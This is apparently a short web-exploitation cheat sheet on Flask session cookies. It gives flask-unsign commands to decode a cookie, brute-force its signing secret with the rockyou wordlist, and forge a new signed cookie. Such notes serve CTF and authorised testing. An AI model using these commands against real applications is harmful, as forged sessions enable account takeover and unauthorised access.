---
title: "Flask Cookie"
date: 2024-6-27
tags: ["Flask", "Python", "Cookie", "Sign", "Unsign", "Web Exploitation"]
---

### Cookie Tools

{{< tab set1 tab1 >}}flask-unsign{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Install
pip3 install flask-unsign
```

```console
# Decode flask cookie
flask-unsign --decode --cookie <COOKIE>
```

```console
# Brute force secret key
flask-unsign --unsign --cookie <COOKIE> -w /usr/share/wordlists/rockyou.txt --no-literal-eval
```

```console
# Forge flask cookie
flask-unsign --sign --cookie <COOKIE_DATA> --secret <SECRET>
```

{{< /tabcontent >}}
